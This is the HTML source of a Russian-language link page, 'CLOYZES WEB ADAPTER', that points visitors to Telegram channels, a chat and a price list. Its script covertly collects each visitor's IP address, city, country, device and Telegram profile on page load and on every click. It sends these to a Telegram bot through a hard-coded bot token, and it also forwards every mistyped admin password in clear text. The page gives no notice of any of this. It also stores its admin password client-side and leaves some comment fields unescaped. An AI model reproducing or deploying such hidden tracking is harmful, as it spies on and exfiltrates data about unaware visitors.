<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
  <title>CLOYZES · WEB ADAPTER</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      min-height: 100vh;
      background: radial-gradient(circle at 30% 10%, #1e1004 0%, #0b0703 100%);
      background-attachment: fixed;
      font-family: 'Inter', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px 16px;
      position: relative;
      color: #fff;
    }
    body::before {
      content: "";
      position: fixed;
      width: 150%;
      height: 150%;
      top: -25%;
      left: -25%;
      background: radial-gradient(circle at 50% 50%, rgba(255, 100, 0, 0.12) 0%, transparent 60%);
      pointer-events: none;
      z-index: 0;
      animation: subtlePulse 10s infinite alternate;
    }
    @keyframes subtlePulse {
      0% { opacity: 0.5; transform: scale(1); }
      100% { opacity: 1; transform: scale(1.02); }
    }
    .adapter-wrapper {
      max-width: 1300px;
      width: 100%;
      margin: 0 auto;
      position: relative;
      z-index: 5;
      backdrop-filter: blur(2px);
    }
    /* Заголовок */
    .header {
      text-align: center;
      margin-bottom: 30px;
      position: relative;
    }
    .glitch-title {
      font-weight: 800;
      font-size: clamp(2.4rem, 12vw, 4.8rem);
      letter-spacing: -0.02em;
      text-transform: uppercase;
      background: linear-gradient(135deg, #ffffff 0%, #ffb87c 45%, #ff7b00 80%);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      text-shadow: 0 0 30px rgba(255, 100, 0, 0.6);
      margin-bottom: 8px;
      animation: titleGlow 3s infinite alternate;
    }
    @keyframes titleGlow {
      0% { text-shadow: 0 0 20px rgba(255, 120, 0, 0.5); }
      100% { text-shadow: 0 0 45px rgba(255, 80, 0, 0.9), 0 0 10px #ff5e00; }
    }
    .sub-line {
      height: 3px;
      width: 120px;
      margin: 10px auto 15px;
      background: linear-gradient(90deg, transparent, #ff8c00, #ff3c00, #ff8c00, transparent);
      border-radius: 100px;
      box-shadow: 0 0 15px #ff6200;
    }
    /* Виджет Telegram */
    .telegram-login-wrapper {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      margin: 15px 0 25px;
      min-height: 40px;
    }
    #telegram-login-btn {
      display: inline-flex;
    }
    #logoutTelegramBtn {
      background: rgba(255, 0, 0, 0.2);
      border: 1px solid #ff4f4f;
      color: #ffaaaa;
      border-radius: 50%;
      width: 36px;
      height: 36px;
      display: none;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      font-size: 16px;
      transition: 0.2s;
    }
    #logoutTelegramBtn:hover { background: rgba(255, 0, 0, 0.4); }
    /* Кнопка админа */
    .admin-trigger {
      position: fixed;
      bottom: 24px;
      right: 24px;
      z-index: 100;
    }
    .admin-btn {
      background: rgba(20, 12, 8, 0.8);
      backdrop-filter: blur(8px);
      border: 1px solid rgba(255, 140, 0, 0.5);
      color: #ffb27a;
      width: 52px;
      height: 52px;
      border-radius: 30px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      cursor: pointer;
      box-shadow: 0 8px 0 #2b1507, 0 5px 20px #000, 0 0 15px #ff7b0040;
      transition: all 0.2s;
      border: 1px solid #ff8c00;
    }
    .admin-btn:hover {
      transform: translateY(4px);
      box-shadow: 0 4px 0 #1f0e04, 0 8px 20px #000;
      background: #ff7b00;
      color: #0c0704;
    }
    /* Карточки - упрощённые */
    .card-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 20px;
      margin-bottom: 30px;
    }
    .card {
      background: rgba(8, 6, 4, 0.7);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 120, 0, 0.25);
      border-radius: 28px;
      padding: 24px 12px 20px;
      box-shadow: 0 15px 25px -10px rgba(0,0,0,0.8);
      transition: transform 0.3s ease, border-color 0.3s;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
    }
    .card:hover {
      transform: translateY(-6px);
      border-color: rgba(255, 140, 0, 0.7);
      background: rgba(12, 8, 5, 0.8);
    }
    .icon-wrapper {
      width: 70px;
      height: 70px;
      background: linear-gradient(145deg, #1e130b, #0d0906);
      border-radius: 22px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 16px;
      border: 1px solid #ff7b0040;
      box-shadow: 0 8px 0 #0a0603, inset 0 2px 4px rgba(255, 180, 80, 0.3);
      transition: 0.2s;
    }
    .card:hover .icon-wrapper {
      border-color: #ff9900;
      box-shadow: 0 6px 0 #0f0904, inset 0 0 15px #ff8c0066;
    }
    .icon-wrapper i {
      font-size: 36px;
      color: transparent;
      background: linear-gradient(135deg, #fff8e7, #ffc285);
      -webkit-background-clip: text;
      background-clip: text;
      text-shadow: 0 0 15px #ff8c00;
    }
    .card h3 {
      font-weight: 700;
      font-size: 1.4rem;
      margin-bottom: 4px;
      color: #fff4e6;
    }
    .badge {
      font-size: 0.75rem;
      font-weight: 500;
      text-transform: uppercase;
      letter-spacing: 1px;
      color: #ffb27a;
      margin-bottom: 18px;
    }
    .card-btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      background: linear-gradient(145deg, #ff7b00, #e65100);
      border: none;
      border-radius: 60px;
      padding: 12px 20px;
      width: 100%;
      max-width: 170px;
      margin-top: auto;
      font-weight: 700;
      font-size: 1rem;
      color: #0c0704;
      text-decoration: none;
      box-shadow: 0 8px 0 #4a1e00, 0 4px 12px rgba(0,0,0,0.5);
      transition: 0.15s;
      border: 1px solid #ffb45b;
      text-transform: uppercase;
      cursor: pointer;
    }
    .card-btn:hover {
      background: linear-gradient(145deg, #ff9a2e, #ff5e00);
      box-shadow: 0 5px 0 #3d1700, 0 6px 15px #000;
      transform: translateY(2px);
    }
    /* Комментарии */
    .comments-section {
      margin-top: 25px;
      padding: 20px;
      background: rgba(8, 5, 3, 0.85);
      backdrop-filter: blur(14px);
      border-radius: 32px;
      border: 1px solid #ff9900;
      box-shadow: 0 0 30px rgba(255, 100, 0, 0.3);
    }
    .comments-title {
      font-size: 1.5rem;
      font-weight: 700;
      color: #ffc285;
      margin-bottom: 16px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .comment-form {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
      align-items: flex-start;
    }
    .comment-avatar {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: #2a1b0f;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      border: 1px solid #ff7b00;
      flex-shrink: 0;
    }
    .comment-avatar img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    .comment-input {
      flex: 1;
      background: #1f140c;
      border: 1px solid #ff8c00;
      border-radius: 50px;
      padding: 12px 18px;
      color: white;
      font-size: 0.95rem;
      outline: none;
      resize: none;
    }
    .comment-submit {
      background: #ff7b00;
      border: none;
      border-radius: 50px;
      padding: 12px 24px;
      font-weight: bold;
      color: #0c0704;
      cursor: pointer;
      box-shadow: 0 5px 0 #4a1e00;
      transition: 0.1s;
      white-space: nowrap;
    }
    .comment-submit:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    .comment-list {
      max-height: 400px;
      overflow-y: auto;
      padding-right: 8px;
    }
    .comment-item {
      display: flex;
      gap: 12px;
      margin-bottom: 16px;
      align-items: flex-start;
    }
    .comment-item .comment-avatar {
      width: 36px;
      height: 36px;
    }
    .comment-body {
      flex: 1;
      background: rgba(20, 12, 8, 0.6);
      border-radius: 20px;
      padding: 10px 16px;
      border: 1px solid #ff7b0030;
    }
    .comment-author {
      font-weight: 600;
      color: #ffb27a;
      font-size: 0.9rem;
      margin-bottom: 4px;
    }
    .comment-text {
      color: #eee;
      font-size: 0.9rem;
    }
    .comment-time {
      font-size: 0.7rem;
      color: #888;
      margin-top: 6px;
    }
    .no-access {
      color: #ffb27a;
      text-align: center;
      font-style: italic;
      padding: 10px;
    }
    /* Админ-панель */
    .modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.8);
      backdrop-filter: blur(8px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 200;
      opacity: 0;
      visibility: hidden;
      transition: 0.2s;
    }
    .modal-overlay.active { opacity: 1; visibility: visible; }
    .admin-modal {
      background: #140e08;
      border: 1px solid #ff7b00;
      border-radius: 40px;
      padding: 32px 28px;
      max-width: 400px;
      width: 90%;
      box-shadow: 0 30px 40px #000, 0 0 30px #ff5e00;
    }
    .admin-modal h2 { color: #ffc285; margin-bottom: 24px; font-weight: 600; }
    .admin-modal input {
      width: 100%;
      padding: 16px 20px;
      background: #1f140c;
      border: 1px solid #ff8c00;
      border-radius: 50px;
      color: white;
      font-size: 1.1rem;
      margin-bottom: 20px;
      outline: none;
    }
    .admin-modal button {
      background: #ff7b00;
      border: none;
      padding: 14px;
      width: 100%;
      border-radius: 50px;
      font-weight: bold;
      font-size: 1.1rem;
      box-shadow: 0 8px 0 #4a1e00;
      cursor: pointer;
      margin-bottom: 12px;
    }
    .admin-modal .secondary-btn {
      background: #2b1b0f;
      color: #ffb27a;
      box-shadow: 0 5px 0 #140b05;
      border: 1px solid #ff7b0050;
    }
    .admin-panel {
      background: rgba(8, 5, 3, 0.95);
      backdrop-filter: blur(16px);
      border-radius: 40px;
      padding: 28px 22px;
      margin-top: 30px;
      border: 1px solid #ff9900;
      box-shadow: 0 0 40px #ff6a00;
      max-height: 500px;
      overflow-y: auto;
      display: none;
    }
    .admin-panel.active { display: block; }
    .log-table { width: 100%; border-collapse: collapse; color: #eee; font-size: 0.9rem; }
    .log-table th { text-align: left; padding: 12px 6px; border-bottom: 2px solid #ff7b00; color: #ffae6a; }
    .log-table td { padding: 10px 6px; border-bottom: 1px solid #3f2a18; }
    .clear-logs-btn, .export-btn { background: #331e0e; border: 1px solid #ff8800; color: #ffbc8a; padding: 8px 16px; border-radius: 30px; cursor: pointer; margin-right: 8px; }
    .logout-btn { background: none; border: 1px solid #ff4f00; color: #ff9066; padding: 6px 14px; border-radius: 30px; cursor: pointer; }
    .hint { margin-top: 20px; text-align: center; color: #ffc8a2; opacity: 0.7; }
    @media screen and (max-width: 780px) {
      .card-grid { grid-template-columns: repeat(2, 1fr); gap: 16px; }
      .card { padding: 20px 10px 16px; }
      .icon-wrapper { width: 60px; height: 60px; }
      .icon-wrapper i { font-size: 30px; }
      .card h3 { font-size: 1.2rem; }
    }
    @media screen and (max-width: 480px) {
      body { padding: 16px 8px; }
      .glitch-title { font-size: 2rem; }
      .card-btn { padding: 10px 12px; font-size: 0.9rem; }
      .comment-form { flex-wrap: wrap; }
      .comment-submit { width: 100%; }
    }
  </style>
</head>
<body>
<div class="adapter-wrapper">
  <div class="header">
    <div class="glitch-title">CLOYZES WEB ADAPTER</div>
    <div class="sub-line"></div>
    <div class="telegram-login-wrapper">
      <div id="telegram-login-btn"></div>
      <div id="logoutTelegramBtn" title="Выйти из Telegram"><i class="fas fa-sign-out-alt"></i></div>
    </div>
  </div>

  <!-- Карточки -->
  <div class="card-grid">
    <div class="card">
      <div class="icon-wrapper"><i class="fas fa-satellite-dish"></i></div>
      <h3>Канал</h3>
      <div class="badge">Telegram · основной</div>
      <a href="https://t.me/+__P-DGkzK-xlMTY1" target="_blank" rel="noopener noreferrer" class="card-btn js-link" data-name="Канал"><span>ОТКРЫТЬ</span> <i class="fas fa-arrow-right"></i></a>
    </div>
    <div class="card">
      <div class="icon-wrapper"><i class="fas fa-comments"></i></div>
      <h3>Чат</h3>
      <div class="badge">Общение · комьюнити</div>
      <a href="https://t.me/+Xn03y4HZW1diZjkx" target="_blank" rel="noopener noreferrer" class="card-btn js-link" data-name="Чат"><span>ОТКРЫТЬ</span> <i class="fas fa-arrow-right"></i></a>
    </div>
    <div class="card">
      <div class="icon-wrapper"><i class="fas fa-tags"></i></div>
      <h3>Прайс</h3>
      <div class="badge">Услуги · стоимость</div>
      <a href="https://t.me/priceviase" target="_blank" rel="noopener noreferrer" class="card-btn js-link" data-name="Прайс"><span>ОТКРЫТЬ</span> <i class="fas fa-arrow-right"></i></a>
    </div>
    <div class="card">
      <div class="icon-wrapper"><i class="fas fa-envelope-open-text"></i></div>
      <h3>Личные сообщения</h3>
      <div class="badge">Написать напрямую</div>
      <a href="http://t.me/viase" target="_blank" rel="noopener noreferrer" class="card-btn js-link" data-name="Личные сообщения"><span>ОТКРЫТЬ</span> <i class="fas fa-arrow-right"></i></a>
    </div>
  </div>

  <!-- Комментарии -->
  <div class="comments-section" id="commentsSection">
    <div class="comments-title"><i class="fas fa-comment-dots"></i> Комментарии</div>
    <div id="commentAccess"></div>
    <div class="comment-list" id="commentList"></div>
  </div>

  <!-- Админ-панель (скрыта) -->
  <div class="admin-panel" id="adminPanel">
    <div class="panel-header">
      <h3><i class="fas fa-shield-alt"></i> АДМИН-ЛОГИ</h3>
      <div>
        <button class="export-btn" id="exportLogsBtn"><i class="fas fa-download"></i> Экспорт</button>
        <button class="clear-logs-btn" id="clearLogsBtn"><i class="fas fa-trash-alt"></i> Очистить</button>
        <button class="logout-btn" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Выйти</button>
      </div>
    </div>
    <div style="overflow-x: auto;">
      <table class="log-table" id="logTable">
        <thead><tr><th>Время</th><th>IP</th><th>Устройство</th><th>Гео</th><th>Telegram</th><th>Действие</th></tr></thead>
        <tbody id="logBody"></tbody>
      </table>
    </div>
    <div class="hint" id="logCount">Записей: 0</div>
  </div>
</div>

<div class="admin-trigger">
  <div class="admin-btn" id="adminBtn"><i class="fas fa-user-secret"></i></div>
</div>

<!-- Модальное окно входа -->
<div class="modal-overlay" id="authModal">
  <div class="admin-modal">
    <h2 id="modalTitle">Вход в админ-панель</h2>
    <input type="password" id="passwordInput" placeholder="Пароль" autocomplete="off">
    <button id="modalPrimaryBtn">Войти</button>
    <button class="secondary-btn" id="modalSecondaryBtn">Установить пароль</button>
    <button class="secondary-btn" id="closeModalBtn">Отмена</button>
    <div id="modalHint" style="color:#ff9f5e; font-size:0.8rem; margin-top:10px;"></div>
  </div>
</div>

<script>
  (function(){
    // НОВЫЙ БОТ
    const TELEGRAM_BOT_TOKEN = '8769455645:AAHBoYZhFJeEyaWNEXM1i4i_P92UFoSDITE';
    const TELEGRAM_CHAT_ID = '8440147333';
    const STORAGE_PASS = 'admin_password';
    const STORAGE_LOGS = 'site_logs';
    const STORAGE_TG = 'telegram_user';
    const STORAGE_COMMENTS = 'site_comments';

    // Telegram уведомления
    async function sendToTelegram(msg) {
      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML'})
        });
      } catch(e) {}
    }

    // Локальное хранилище
    function getLogs() { return JSON.parse(localStorage.getItem(STORAGE_LOGS)) || []; }
    function saveLogs(logs) { localStorage.setItem(STORAGE_LOGS, JSON.stringify(logs)); }
    function addLog(entry) {
      const logs = getLogs(); logs.push(entry); saveLogs(logs);
      if (isAdminPanelVisible()) renderLogs();
    }
    function getPassword() { return localStorage.getItem(STORAGE_PASS); }
    function setPassword(p) { localStorage.setItem(STORAGE_PASS, p); }
    function getTelegramUser() { return JSON.parse(localStorage.getItem(STORAGE_TG)); }
    function setTelegramUser(user) { localStorage.setItem(STORAGE_TG, JSON.stringify(user)); }
    function clearTelegramUser() { localStorage.removeItem(STORAGE_TG); }
    function getComments() { return JSON.parse(localStorage.getItem(STORAGE_COMMENTS)) || []; }
    function saveComments(comments) { localStorage.setItem(STORAGE_COMMENTS, JSON.stringify(comments)); }
    function addComment(comment) {
      const comments = getComments();
      comments.push(comment);
      saveComments(comments);
      renderComments();
    }

    // UI элементы
    const adminPanel = document.getElementById('adminPanel');
    const logBody = document.getElementById('logBody');
    const logCount = document.getElementById('logCount');
    let isAdmin = false;
    function isAdminPanelVisible() { return adminPanel.classList.contains('active'); }

    function renderLogs() {
      const logs = getLogs();
      logBody.innerHTML = '';
      if (!logs.length) {
        logBody.innerHTML = '<tr><td colspan="6" style="padding:20px;text-align:center;color:#aaa;">Нет записей</td></tr>';
        logCount.textContent = 'Записей: 0';
        return;
      }
      logs.slice().reverse().forEach(l => {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td>${l.time}</td><td>${l.ip}</td><td>${l.device || '—'}</td><td>${l.geo || '—'}</td><td>${l.telegram || '—'}</td><td>${l.action}</td>`;
        logBody.appendChild(tr);
      });
      logCount.textContent = `Записей: ${logs.length}`;
    }

    // Информация об устройстве
    function getDeviceInfo() {
      const ua = navigator.userAgent;
      let device = 'ПК / Ноутбук';
      if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) device = 'Мобильное устройство';
      const browser = ua.includes('Chrome') ? 'Chrome' : (ua.includes('Firefox') ? 'Firefox' : 'Safari');
      return `${device} | ${browser}`;
    }

    // IP и гео
    async function getIpAndGeo() {
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const { ip } = await ipRes.json();
        const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,message,country,city`);
        const geo = await geoRes.json();
        if (geo.status === 'success') {
          const geoStr = [geo.city, geo.country].filter(Boolean).join(', ').trim();
          return { ip, geo: geoStr || '—' };
        }
      } catch(e) {}
      return { ip: '?', geo: '—' };
    }

    // Полное описание Telegram профиля
    function getTelegramFullDescription() {
      const user = getTelegramUser();
      if (!user) return '—';
      let desc = '';
      if (user.first_name) desc += user.first_name;
      if (user.last_name) desc += ' ' + user.last_name;
      if (user.username) desc += ` (@${user.username})`;
      if (!desc.trim()) desc = `ID: ${user.id}`;
      return desc.trim();
    }

    async function logEvent(action) {
      const { ip, geo } = await getIpAndGeo();
      const time = new Date().toLocaleString('ru-RU');
      const device = getDeviceInfo();
      const telegram = getTelegramFullDescription();
      addLog({ time, ip, device, geo, telegram, action });
      const tgInfo = telegram !== '—' ? `\n👤 ${telegram}` : '';
      sendToTelegram(`🕒 ${time}\n🌐 IP: ${ip}\n📱 ${device}\n📍 ${geo}${tgInfo}\n📌 ${action}`);
    }

    // ========== КОММЕНТАРИИ ==========
    function renderCommentAccess() {
      const container = document.getElementById('commentAccess');
      const user = getTelegramUser();
      if (!user) {
        container.innerHTML = '<div class="no-access"><i class="fas fa-lock"></i> Войдите через Telegram, чтобы оставить комментарий.</div>';
      } else {
        const avatarUrl = user.photo_url || '';
        container.innerHTML = `
          <div class="comment-form">
            <div class="comment-avatar">${avatarUrl ? `<img src="${avatarUrl}" alt="ava">` : '<i class="fas fa-user"></i>'}</div>
            <input type="text" class="comment-input" id="commentInput" placeholder="Напишите комментарий..." maxlength="500">
            <button class="comment-submit" id="commentSubmitBtn"><i class="fas fa-paper-plane"></i> Отправить</button>
          </div>
        `;
        document.getElementById('commentSubmitBtn').addEventListener('click', () => {
          const input = document.getElementById('commentInput');
          const text = input.value.trim();
          if (!text) return;
          const comment = {
            user: { ...user }, // сохраняем полный профиль
            text: text,
            time: new Date().toLocaleString('ru-RU')
          };
          addComment(comment);
          input.value = '';
          logEvent('💬 Оставил комментарий');
        });
      }
    }

    function renderComments() {
      const list = document.getElementById('commentList');
      const comments = getComments();
      list.innerHTML = comments.map(c => {
        const avatarUrl = c.user.photo_url || '';
        const name = [c.user.first_name, c.user.last_name].filter(Boolean).join(' ') || 'Пользователь';
        const username = c.user.username ? `@${c.user.username}` : '';
        return `
          <div class="comment-item">
            <div class="comment-avatar">${avatarUrl ? `<img src="${avatarUrl}" alt="ava">` : '<i class="fas fa-user"></i>'}</div>
            <div class="comment-body">
              <div class="comment-author">${name} ${username ? `<span style="color:#ffa055;">${username}</span>` : ''}</div>
              <div class="comment-text">${escapeHtml(c.text)}</div>
              <div class="comment-time">${c.time}</div>
            </div>
          </div>
        `;
      }).join('');
    }

    function escapeHtml(text) {
      return text.replace(/[&<>"']/g, function(m) {
        return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' }[m];
      });
    }

    function refreshCommentsUI() {
      renderCommentAccess();
      renderComments();
    }

    // ========== ИНИЦИАЛИЗАЦИЯ TELEGRAM LOGIN ==========
    async function initTelegramLogin() {
      try {
        window.TelegramLoginWidget = {
          dataOnauth: (user) => {
            // Сохраняем весь объект user (id, first_name, last_name, username, photo_url, auth_date, hash)
            setTelegramUser(user);
            updateLogoutButton();
            refreshCommentsUI();
            logEvent('✅ Авторизация через Telegram');
          }
        };
        const container = document.getElementById('telegram-login-btn');
        container.innerHTML = '';
        const script = document.createElement('script');
        script.src = 'https://telegram.org/js/telegram-widget.js?22';
        script.setAttribute('data-telegram-login', 'AuthenticationAdapter_bot');
        script.setAttribute('data-size', 'medium');
        script.setAttribute('data-userpic', 'false');
        script.setAttribute('data-radius', '20');
        script.setAttribute('data-onauth', 'TelegramLoginWidget.dataOnauth(user)');
        container.appendChild(script);
      } catch(e) {}
    }

    function updateLogoutButton() {
      const btn = document.getElementById('logoutTelegramBtn');
      btn.style.display = getTelegramUser() ? 'flex' : 'none';
    }

    document.getElementById('logoutTelegramBtn').addEventListener('click', () => {
      clearTelegramUser();
      updateLogoutButton();
      refreshCommentsUI();
      logEvent('🚪 Выход из Telegram на сайте');
      document.getElementById('telegram-login-btn').innerHTML = '';
      initTelegramLogin();
    });

    // Старт приложения
    (async () => {
      initTelegramLogin();
      updateLogoutButton();
      refreshCommentsUI();
      await logEvent('🌐 Посещение страницы');
      document.querySelectorAll('.js-link').forEach(btn => {
        btn.addEventListener('click', (e) => {
          logEvent(`🔗 Переход: ${btn.dataset.name}`);
        });
      });
    })();

    // ========== АДМИНКА ==========
    const authModal = document.getElementById('authModal');
    function openAuthModal(mode) {
      const has = !!getPassword();
      document.getElementById('modalTitle').textContent = has ? (mode==='set'?'Смена пароля':'Вход в админ-панель') : 'Установите пароль';
      document.getElementById('modalPrimaryBtn').textContent = has ? (mode==='set'?'Сменить':'Войти') : 'Сохранить';
      document.getElementById('modalSecondaryBtn').style.display = has && mode!=='set' ? 'block' : 'none';
      document.getElementById('modalHint').textContent = '';
      document.getElementById('passwordInput').value = '';
      authModal.classList.add('active');
    }
    document.getElementById('adminBtn').onclick = () => {
      if (isAdmin) { adminPanel.classList.toggle('active'); if(adminPanel.classList.contains('active')) renderLogs(); }
      else openAuthModal('login');
    };
    document.getElementById('modalPrimaryBtn').onclick = async () => {
      const pass = document.getElementById('passwordInput').value.trim();
      if(!pass) return;
      const stored = getPassword();
      if(!stored) { setPassword(pass); isAdmin=true; authModal.classList.remove('active'); adminPanel.classList.add('active'); renderLogs(); logEvent('🔐 Установлен пароль администратора'); }
      else {
        const isSet = document.getElementById('modalPrimaryBtn').textContent.includes('Сменить');
        if(isSet) { setPassword(pass); authModal.classList.remove('active'); logEvent('🔑 Пароль изменён'); }
        else if(pass === stored) { isAdmin=true; authModal.classList.remove('active'); adminPanel.classList.add('active'); renderLogs(); logEvent('✅ Вход в админку'); }
        else {
          document.getElementById('modalHint').textContent = 'Неверный пароль';
          const { ip, geo } = await getIpAndGeo();
          const device = getDeviceInfo();
          const tg = getTelegramFullDescription();
          sendToTelegram(`⚠️ Неверный ввод пароля!\n🕒 ${new Date().toLocaleString('ru-RU')}\n🌐 IP: ${ip}\n📱 ${device}\n📍 ${geo}${tg !== '—' ? '\n👤 ' + tg : ''}\n🔑 Введённый пароль: ${pass}`);
        }
      }
    };
    document.getElementById('modalSecondaryBtn').onclick = () => { if(getPassword()) openAuthModal('set'); };
    document.getElementById('closeModalBtn').onclick = () => authModal.classList.remove('active');
    document.getElementById('logoutBtn').onclick = async () => { isAdmin=false; adminPanel.classList.remove('active'); logEvent('🚪 Выход из админки'); };
    document.getElementById('clearLogsBtn').onclick = () => { if(confirm('Очистить все логи?')) { localStorage.setItem(STORAGE_LOGS, '[]'); renderLogs(); logEvent('🧹 Логи очищены'); } };
    document.getElementById('exportLogsBtn').onclick = () => {
      const blob = new Blob([JSON.stringify(getLogs(), null, 2)], {type: 'application/json'});
      const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
      a.download = `cloyzes_logs_${new Date().toISOString().slice(0,10)}.json`; a.click();
      logEvent('📤 Экспорт логов');
    };
    authModal.addEventListener('click', e => { if(e.target===authModal) authModal.classList.remove('active'); });
  })();
</script>
</body>
</html>
